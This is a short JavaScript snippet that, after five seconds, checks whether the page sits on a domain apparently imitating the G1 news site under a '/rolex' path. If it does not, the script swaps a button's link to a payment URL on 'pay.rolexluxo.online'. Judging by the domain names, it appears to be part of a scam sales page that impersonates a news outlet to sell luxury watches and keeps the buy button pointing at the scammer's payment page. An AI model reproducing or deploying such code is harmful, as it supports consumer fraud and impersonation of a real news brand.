
function verificarLink() {
    var urlAtual = window.location.href;
    var dominioEsperado = "https://g1.noticiamundo.online/rolex";

  
    if (urlAtual.indexOf(dominioEsperado) === -1) {
     
      var botao = document.getElementById("id-do-botao");
      botao.href = "https://pay.rolexluxo.online/YEwR3AvnYbpZdKy";
    }
  }


  setTimeout(verificarLink, 5 * 1000);
